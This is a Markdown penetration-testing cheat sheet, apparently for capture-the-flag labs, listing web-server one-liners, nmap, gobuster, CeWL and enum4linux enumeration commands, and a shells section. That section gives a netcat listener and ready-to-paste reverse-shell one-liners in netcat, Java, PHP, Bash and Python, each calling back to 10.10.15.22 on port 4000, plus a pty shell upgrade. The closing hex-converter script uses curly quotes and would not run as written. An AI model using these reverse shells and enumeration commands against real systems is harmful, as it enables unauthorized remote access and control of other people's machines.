# CheatSheet

## Webserver

### Python

```python
python -m SimpleHTTPServer
```

```python
python3 -m http.server
```

### PHP
```php
php -S 0.0.0.0:8000
```
### Ruby
```ruby
ruby -run -e httpd . -p 8000
```
## [nmap](https://tools.kali.org/information-gathering/nmap)
```shell-script
nmap -sC -sV -oA nmap/openadmin 10.10.10.171
```
## [gobuster](https://tools.kali.org/web-applications/gobuster)
bruteforce websites to find directories
```bash
gobuster dir -u http:10.10.10.10/ -w /path/to/wordlist
```
##  [CeWL](https://tools.kali.org/password-attacks/cewl)
creates wordlist from website
```bash
cewl -d 2 -m 5 -w genwords.txt https://10.10.10.10
```
## [enum4linux](https://tools.kali.org/information-gathering/enum4linux)
enumerates Windows and Samba systems 

Ports to look for: 445, 139
```bash
enum4linux -U -o 10.10.10.10
```
## Shells

### Set Listener 
```bash
nc -lnvp 4000
```

### [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
#### netcat
```bash
nc -e /bin/sh 10.10.15.22 4000
```
#### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.15.22/4000;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
#### PHP
```php
php -r '$sock=fsockopen("10.10.15.22",4000);exec("/bin/sh -i <&3 >&3 2>&3");'
```
#### Bash
```bash
bash -i >& /dev/tcp/10.10.15.22/4000 0>&1
```
#### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.22",4000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### Interactive Shell
#### Python 
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Usefuls Scripts
### HEX Converter
```bash
#!/bin/bash
echo $1 | tr -d “\n” | hexdump -e ‘16/1 “%02x “ “\n”
```
